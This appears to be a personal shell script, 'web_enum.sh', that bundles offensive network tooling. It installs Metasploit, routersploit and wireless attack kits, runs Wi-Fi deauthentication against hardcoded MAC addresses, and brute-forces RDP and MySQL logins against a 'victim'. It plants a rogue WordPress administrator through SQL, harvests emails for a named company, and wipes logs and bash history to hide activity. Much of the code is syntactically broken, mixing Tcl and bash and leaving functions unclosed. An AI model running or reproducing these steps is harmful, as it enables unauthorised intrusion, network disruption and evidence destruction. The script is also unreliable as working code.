#!/bin/sh

#  web_enum.sh
#  sadfasf
#
#  Created by a-robot on 6/15/22.
#  


#!/bin/bash


#!/bin/sh

#  Script.sh
#
# regex101.com
# https://github.com/aboul3la/Sublist3r
# http probe
# https://github.com/NicolasSiver/http-probe
#  Created by a-robot on 3/14/22.
# https://www.youtube.com/watch?v=Gaf1Z1bwbpY
# eyewitness
# https://github.com/FortyNorthSecurity/EyeWitness

#online OSNIT
#https://api.wigle.net/
#https://www.nirsoft.net/ (look thins up, powerful tool)
#http://geoiplookup.net/ ### GEO IP LCOATIONS
#tracemyip.org

set user [index $argv 1]
set pass [index $argv 2]
set nic[index $argv 3]
set cwd [index $argv 6]
set broadcastID [index $argv 4]
set testServerIP [index $argv 5]
set nmapVulnsPath  [index $argv 7]
set passwordsList [index $argv 8]

function defaultVals {
			for i in "$@" ;
	do
		if [[-z $i == "user"]] ; then
			echo "[-] user not set, please provide user for the home user\n "; read user
		fi
		if [[-z $i == "pass"]] ; then
			echo "[-] pass not set, using default val\n "; read pass
		fi
		if [[-z $i == "cwd" ]] ; then
			cwd = $(pwd -p) && echo "[-] IP Is not set, using default vals\n $(_ip_addr)"
		fi
		if [[-z $i == "nmapVulnsPath"]] ; then
			echo "[-] nmapVulnsPath not set, defaulting val\n $(nmapVulnsPath) "
			nmapVulnsPath = '~/.nmap/scripts/'
		fi
		if [[-z $i == "nmapVulnsPath"]] ; then
			echo "[-] test server ip not defined, referring to default"
			testServerIP = '192.168.50.1'
		fi
		
	break
	done
}

function makeDir() {
	cd '/home/' && mkdir exploitsDir && chmod +r +x ./exploitsDir && mkdir savedData && chmod +r +x ./exploitsDir
}


# install metasploit, lay script,
function Get_Clone(){
	sudo cd /home/exploitsDir && echo "Getting Dependencies"
	sudo apt install proxychains -y
		proxychains sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get autoremove && sudo apt-get autoclean -y
		proxychains git clone 'https://github.com/aboul3la/Sublist3r'
		proxychains git clone 'https://github.com/NicolasSiver/http-probe'
		proxychains git clone 'https://github.com/FortyNorthSecurity/EyeWitness'
		proxychains git clone "https://github.com/darkoperator/dnsrecon" ** cd dnsrecon	&& .chmod -r +x ./ && make install
		proxychains git clone "https://github.com/xroche/httrack.git" --recurse && cd httrack && ./configure --prefix=$HOME/usr && make -j8 && make install
		proxychains git clone "https://github.com/arismelachroinos/lscript.git" && cd lscript && ./install.sh && chmod +x install.sh
		proxychains git clone "https://github.com/aboul3la/Sublist3r"
	proxychains sudo apt install httrack -y,  webhttrack -y, 	dnsrecon -y, netcat -y, dig -y, httrack -y, postgresq -y, dnsutils -y, netcat  -y, dnsutils -y, netstat -y, nginx -y, nmap -y, network-manager -y, perl -y, eyewitness -y, python3-pip -y, 	libglib2.0-dev -y, wget -y, curl -y, git -y, tree -y, cifs-utils -y, dnsmasq -y, wireshark -y, golang -y
	proxychains git clone https://www.github.com/threat9/routersploit && cd routersploit && python3 -m pip install -r requirements.txt && python3 rsf.py && python3 -m pip install bluepy
	proxychains git clone "https://github.com/royhills/ike-scan" && cd ike-scan && autoreconf --install && ./configure --with-openssl && make && make install
	proxychains wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run && sudo chmod +x ./metasploit-latest-linux-x64-installer.run && sudo ./metasploit-latest-linux-x64-installer.run
	
	sudo proxychains wget "https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass" && chmod +x covermyass && ./covermyass
	sudo proxychains apt install gnupg -y && sudo apt install rng-tools -y && sudo mkdir /etc/sysInfo -y && sudo apt install pgp -y
	sudo proxychains git clone https://github.com/evilsocket/bettercap && cd bettercap && bundle instal && gem build bettercap.gemspec && sudo gem install bettercap*.gem
 sudo proxychains apt-get install build-essential ruby-dev libpcap-dev && go get github.com/bettercap/bettercap && cd $GOPATH/src/github.com/bettercap/bettercap && make build && make install
 
 sudo ufw allow samba
 sudo proxychains pip3 install h8mail
 sudo proxychains apt-get install python3-pip gpsd gpsd-clients python3-tk python3-setuptools
 sudo proxychains pip3 install QScintilla PyQtChart gps3 dronekit manuf python-dateutil numpy matplotlib
 sudo proxychains apt-get install python3-pip gpsd gpsd-clients python3-tk python3-setuptools python3-pyqt5.qtchart
 sudo proxychains pip3 install QScintilla gps3 dronekit manuf python-dateutil numpy matplotlib
 sudo proxychains git clone https://github.com/bitbrute/evillimiter.git && cd evillimiter && sudo python3 setup.py install
 
 sudo proxychains git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
 sudo proxychains apt install build-essential git libwebsockets-dev pkg-config zlib1g-dev libnl-3-dev libnl-genl-3-dev libcap-dev libpcap-dev libnm-dev libdw-dev libsqlite3-dev libprotobuf-dev libprotobuf-c-dev protobuf-compiler protobuf-c-compiler libsensors4-dev libusb-1.0-0-dev python3 python3-setuptools python3-protobuf python3-requests python3-numpy python3-serial python3-usb python3-dev python3-websockets librtlsdr0 libubertooth-dev libbtbb-dev
 git proxychains clone "https://www.kismetwireless.net/git/kismet.git" && cd kismet && git pull && cd kismet && ./configure &&  make &&  make -j$(nproc) && sudo make suidinstall && sudo usermod -aG kismet $USER && newgrp -
 sudo apt-get install macchanger aircrack-ng
sudo apt install ncrack
sudo apt install nbtscan-unixwiz
sudo apt install nasty -y && libc6 -y ## to recovoer lost ssl passpharse



}

#scan limit 1,2,3,4,5,6 200kbit ## LIMIT OR BLOCK NETWORK USERS block 3 hosts free all
function kickNetworkMembers () {
sudo evillimiter
}
function deathUsers () {
	cd /home/exploitsDirs/airgeddon && bash airgeddon.sh
}
# https://github.com/ghostop14/sparrow-wifi
function guiNetworkMonitor () { sudo ./sparrow-wifi.py }
function runBluetoothRecon () { ble.recon on && ble.show  && ble.enum $_mac  }
function runBettercap {} { sudo bettercap }
## NMAP VULNERS ON MAC ##
function getNmapVulns() {
	proxychains git clone "https://github.com/vulnersCom/nmap-vulners"
	proxychains nmap --script-updatedb
	cd /usr/local/Cellar/nmap/7.92/share/nmap/scripts && ls-al > macNmapVulners ## mac
	mkdir  ~/home/EXPLOITS/ && cp macNmapVulners ~/home/EXPLOITS/
	~/.nmap/scripts=/ # or $NMAPDIR ## LNUX
}

function findResponsePackets { sudo ike-scan $testServerIP #ike-scan --file=hostlist.txt }

function randomizeMAC () {
	sudo iwconfig wirelessInterface down && sudo macchanger -r wirelessInterface
}
function recoverPGPpass () {
	nasty - A
}

function singRouterSolicitation() {
	sudo sing -rts $testServerIP
}

## send spoofed packet disguised as packet as a router: fatehrrouter.xtc
function singRouterAdvert () {
sing -rta router1.xtc/20 -rta router2.xtc/50 -rta router3.xtc -S fatherouter.xtc death.es
}

function singTcpRedirect {
  sing -red -S infect.comx -gw 10.12.12.12 -dest death.es -x host -prot tcp -psrc 100 -pdst 90 dwdwah.xx
}
function singIMCPTraceroute () {
	sing -R $testServerIP
}
function singOSTesting () {
	sing -mask -O $testServerIP ## solaris
	sing -O $testServerIP ## windwos
	sing -s 32 -F 8 $testServerIP
}





}
function findRouterMAC () {
	sudo proxychains netdiscover -r 192.168.50.1/24
	sudo proxychains aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1
	ip a
	echo 'enter the wireless broadcasting nic from above  '; read $wirelessInterface
	sudo airmon-ng start $wirelessInterface
	sudo airodump-ng wirelessInterface -c 11 --encrypt OPN
	sudo ifconfig nicNonMonitorMode down
	sudo macchanger -m newMacfromabove nicNonMonitormode
	sudo ifconfig nicNonMonitorMode up 
}

# nbtscan-unixwiz is a command-line tool that scans for open NETBIOS nameservers on a local or remote TCP/IP network.
function findNetBiosNameserver() {
	#nbtscan-unixwiz -n $testServerIP #range
	sudo proxychains nbtscan-unixwiz -f $testServerIP #single
	sudo proxychains nbtscan-unixwiz -f $testServerIP | less #single

}

function ncrackBruteForce () { sudo proxychains ncrack -v -iL win.txt --user victim -P passes.txt -p rdp CL=1 }
function runMetasploit() { sudo msfconfsole }
function setupMetasploit() { sudo service postgresql Start  && msfdb Init }
function updateRoutersploit() { sudo msfupdate && cd routersploit && git pull }
function runRoutersploit () { cd ./home/
function configureNexus () {
	sudo apt install ./Nessus*_amd64.deb && less $(/opt/nessus/sbin/nessuscli fetch --code-in-use)

	firefox https://www.tenable.com/downloads/nessus?loginAttempted=true
	## chromium "http://localhost:8889"
	cd ~/home/EXPLOITS && tar xvzf nexus-<version>.<tar file extension> && less $(/opt/nessus/sbin/nessuscli fetch --code-in-use)
	sudo systemctl enable --now nessusd
	sudo ufw allow 8834 && sudo -i
	sudo systemctl status nessusd
	export PATH=$PATH:/opt/nessus/sbin/
	source ~/.bashrc
	update --all
}

function osnit  {}

function clearLogs() { sudo covermyass now && rm /root/.bash_history }
function pingSweep(){
	for ip in {1..254}
		do ping -c 3 192.168.50.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
			echo "Update Log: " > sweep_log.txt
			date >> sweep_log.txt
	done
}

function getDomainEmails() {
	sudo theharvester -d priceline.com -l 1000 -b pgp && theharvester -d priceline.com -l 1000 -b pgp
	python3 h8mail.py -t '/root/h8mail/targets.txt' -bc '~/BreachCompilation' --local
	h8mail -u "https://pastebin.com/raw/kQ6WNKqY" "list_of_urls.txt" # Fetch URL content (CLI + file). Target all found emails
	h8mail -t 42.202.0.42 -q ip -c h8mail_config_priv.ini -ch 2 --power-chase # Query IP. Chase all related targets. Read keys from CLI
}
function getIwEvents() { sudo iwevent  }
function getCurrentEssid() { sudo iwgetid  }

function scanSQL {
	sudo proxychains nmap -sS -v -Pn <<RDS Instance>>
	tree -L -2 ./ && pwd && echo "Enter path for passwords list \n"; read passwordList
	echo "[!] Enter an active RDS port from scan \n"; read scannedRDS
	sudo nmap -sS -A -vv -Pn -sV -p $(scannedRDS) --script=mysql-info, mysql-enum <<RDS Instance>>
	hydra -l admin -P $passwordList <RDS IP Address> mysql
	mysql -h <<RDS Instance name>> -p 3306 -u admin -p
	use newblog && showtables && makeTable
}



function nmapPortServices { sudo proxychains nmap -sV -Pn -v $testServerIP }
function nmapnmap -sn -v - A--version-intenstity=9 192.168.50.1/24
function nmapPingScan() { nmap -p }

function cleanSshTunnel() {
	sudo shuttle -r `user_email` _ip_addr/"24" -vv 
}
function sshTunnel() { # TCP over TCP, -- slow
	ssh -f -N -D 1080 $_ip_addr
	curl --max-time 3 -x socks5h://127.0.0.1:1080 $_ip_addr
}
function makeTable{
	INSERT INTO `wp_users` (`user_login`, `user_pass` ,`user_nicename`,`user_email`,`user_status`)
	VALUES (`new_admin`, MD5(`pass123`), `firstname lastname`, `fake@fakeemail.com`, `0` );
	
	INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
	VALUES (NULL, (Select max(id) FROM wp_users), `wp_capabilities`, a:1:{s:13:"administrator"; s:1:"1" ; } );
	
	INSERT INTO `wp_usermeta` (`umeta_id`,  `user_id`, `meta_key`, `meta_value` )
	VALUES (NULL, (Select max(id) FROM wp_users), )
	
}



function broadcast {
	_dirs=$(ls *.txt)
	_broadcast = $(ifconfig | grep broadcast)
	_inet = $(ifconfig | grep inet)
	_mac = $(ifconfig | grep mac)
	_radio_name = $(iw dev | awk) '$1=="Interface"{print $2}'
	_ip_addr = $(ip addr)
	_usb = $(lsusb)
	_mac = $(ifconfig | grep mac)
	
	_devInfo01 = $(powermetrics)
	_devInfo02 = $(Infix -Fxz)
	DIRS=$(ls *.txt)
	broadcast = $(ifconfig | grep broadcast)
}


function shipInfo() {
	ssh $destination && mkdir ~/home/SCP_INFO/ && cd ~/home/SCP_INFO/
	scp $CWD/*.txt $destination:~/home/SCP_INFO/
}



function show_host() {
	echo($_devInfo01)
	echo($_devInfo02)
	echo($_mac)
	echo($_inet)
	echo($_ip_addr)
	echo($_usb )
	echo($_mac)
}


function getIPfromDNS()
    netcat website
	host $website
    dig $website
    dnsrecon $website
}

function stealDarrensSite() {
	mkdir /home/CURLED_WEBSITE && cd /home/CURLED_WEBSITE
	curl -o $website
	mkdir /home/WGET_WEBSITE && cd /home/WGET_WEBSITE
	wget $website
	mkdir /home/HTTPRACK_WEBSITE && cd /home/HTTPRACK_WEBSITE
	httrack -w $website
	}


function setExpress() {
	sudo mkdir /home/EXPRESS && cd /home/EXPRESS
	curl($express)
}

function deepOSNIT() {
	cd /home/exploitsDir/the_harvester/
	sudo proxychains python3 theHarvester.py -d $testServerIP -l 500 -b all
}

function _mountXploits() {
	function handleFiles() {
		cd /etc/fstab/ &&  ls -al > cifsMountLogs.txt
		cp cifsMountLogs.txt $SAVE_DIR
	}
	#mount.cifs //192.168.50.77/a/ROMS/psp /media/usb1/retropie-mount/roms/psp -o user='adel a2’
		mount.cifs //192.168.50.77/b/ //MOUNTED_EXPLOITS -o user=‘HOME_USER’
		mount -t cifs -o vers=1.0,username=t0b1,password=$pw //server.local/shared/ /media/shared
		handleFiles
}


function scanNetwork {
	netstat $testServerIP
	netstat -rn $testServerIP
	nc $testServerIP
	nmap
}

function findWEPProtected ()
	sudo nmap -sP -n 192.168.0.0/24
	airodump-ng wlx0013eff5483f -c 11
	netdiscover -r 192.168.50.1/24
	airodump-ng wlx0013eff5483f --encrypt wep
	sudo iwlist wlx0013eff5483f scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID'
	
	aireplay-ng -0 0 mac -c mac_of_radio radio_name
	airemon-ng start external_radio 6 # the number is the channel  (TO START MONITOR MODE)
	kismet -c radio_name  ## GETS THE MAC ADDRESS

}
function findSurroundingDevicesAndDistance () { sudo iw dev wlx0013eff5483f scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort }


function returnAvailableMACS () {
	sudo airodump-ng wlx0013eff5483f --encrypt wep

}
function timePacketTrip() { ping localhost && tracert localhost }
function Mkdirs(){
    if [! -d "third_levels"]; then
        mkdir third_levels
    fi
    if [! -d "scans"]; then
        mkdir scans
    fi
    if [! -d "eyewitness"]; then
        mkdir eyewitness
    fi
}


function getIPfromDNS()
    $(netcat $website)
    $(host $website)
    $(dig $website)
    $(dnsrecon $website)
}

function curlSite() {
	mkdir /home/CURLED_WEBSITE && cd /home/CURLED_WEBSITE
	curl -o $website
	mkdir /home/WGET_WEBSITE && cd /home/WGET_WEBSITE
	wget $website
	mkdir /home/HTTPRACK_WEBSITE && cd /home/HTTPRACK_WEBSITE
	httrack -w $website
	}

	function enumSubDomains() {
		git clone "https://github.com/FortyNorthSecurity/EyeWitness"
		wget https://github.com/aboul3la/Sublist3r/archive/master.zip
		unzip master.zip
		./sublist3r.py -d $website
		./EyeWitness.py -f $website --web --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 --timeout 120
		echo "starting sub-domin grab"
		sublist3r -d $1 -o final.txt
		./EyeWitness.py -f final.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 --timeout 120

		echo 'compiling 3rd level domain'
		cat domain_list.txt | grep -Po "(\w+\.\w+\.\w+)$" | sort -u >> third-level.txt
		./EyeWitness.py -f domain_list.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 --timeout 120
		./EyeWitness.py -f third-level.txt.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 --timeout 120


	echo 'Enumerating through domain for [FULL] Sublistings'
	for domain in $(cat third-level.txt);
	    do sublist3r -d $domain -o third_levels/$domain.txt;
		cat third_levels/$domain.txt;
		sort -u >> final.txt;
	 ./EyeWitness.py -f $domain.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 --timeout 120

	done

	if [ $# -eq 2 ]; ## to check the amount of paramantes [assed to sys] ## it is stored in $#

	then
	    echo "probing for [domains] 3rd level--[GREP]"
	    cat final.txt | sort -u | grep -v $2 | httprobe -s - p https:443 | sed 's/https\?:\/\///' | tr -d ":443" > probed.txt

	else
	    echo "probing for [domains] , [HTTP-PROBE]"
	    ./EyeWitness.py -f probed.txt --web --proxy-ip 127.0.0.1 --proxy-port 8080 --proxy-type socks5 --timeout 120
	    cat final.txt | sort -u | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ":443" > probed.txt
	fi
	

}

function droopScann() {
	git clone https://github.com/droope/droopescan.git
	apt install python-pip
	pip install droopscan
	pip install -r requirements.txt
	./droopescan scan --help

	## doopscan to scan vulnrable webservers
	droopscan scan drupal -u URL_HERE
	droopscan scan silverstripe -u URL_HERE
	./droopescan scan --help
	droopescan scan drupal -u example.org
	droopescan scan drupal -U list_of_urls.txt
	droopescan scan -U list_of_urls.txt
}


function testSpecificPort {
	echo "Enter the port for testing \n " read NC_PORT
	if [[ $(nc -z localhost ${NC_PORT}) -eq 0 ]]; then
		echo "Tomcat is up"
	    echo $(NC_PORT)
	else
		echo "Tomcat is shutdown"
	    echo $(NC_PORT)
	fi
}


## ARP SCAN
function arpScan() {proxychains arp-scan --interface=eth0 $testServerIP && proxychains arp-fingerprint 192.168.0.1 $testServerIP
}


function getMAC() {
kismet -c radio_name  ## GETS THE MAC ADDRESS
}

function openPortScan {
	echo "scanning for open ports" && proxychains nmap -iL probed.txt -T5 -oA scans/port_scan.txt -V
	echo "Eyewitness" && proxychains eyewitness -f $pwd/probed.txt -d $1 --all-protocols
	mv /usr/share/eyewitness/$1 eyewitness/$1
}
### threatviews ##
## NMAP VULNERS ON MAC ##
function setupNmapVulns() {
	git clone "https://github.com/vulnersCom/nmap-vulners"
	proxychains nmap --script-updatedb
	cd /usr/local/Cellar/nmap/7.92/share/nmap/scripts && ls-al > macNmapVulners ## mac
	mkdir  ~/home/EXPLOITS/ && cp macNmapVulners ~/home/EXPLOITS/
	~/.nmap/scripts # or $NMAPDIR ## LNUX
}
function checkSSLVulns () {proxychains tlssled $testServerIP && proxychains sslscan -h $testServerIP}
function grabSSLCerts () { proxychains sslyze $testServerIP  }
function trackDNS() {
	proxychains dnstracer $testServerIP && nslookup $testServerIP
		proxychains dig $testServerIP
		proxychains dig $testServerIP  -t mx
		proxychains dig $testServerIP  -t ns
		proxychains dig $testServerIP  AAAA # ipv6 addresses
		proxychains host $testServerIP ## returns host IP and mailserver
		proxychains host -t ns $testServerIP
		proxychains host -t mx $testServerIP
		proxychains host $testServerIP dns

}


function nmapBasic () { nmap -sV -pN -oX "home/savedData/nmapBasic.xml" $testServerIP # basic nmap scan}
function nmapOS() { nmap -A -Pn -oX "home/savedData/nmapOS.xml" xxx/0/24 > nmapBasic.txt $testServerIP }
function nmapDnsBrute() { sudo nmap -sV $testServerIP -scrip dns-brute }
function nmapPortKnock() { sudo nmap -sV -Pn -v $testServerIP }
function compareHashOnline00 { firefox "weakleakinfo.to/v2/ " }
function compareHashOnline00 { firefox "leakcheck.io " }
	


function main () {
	setupNmapVulns
	Get_Clone
	Mkdirs
	_mountXploits
}

main
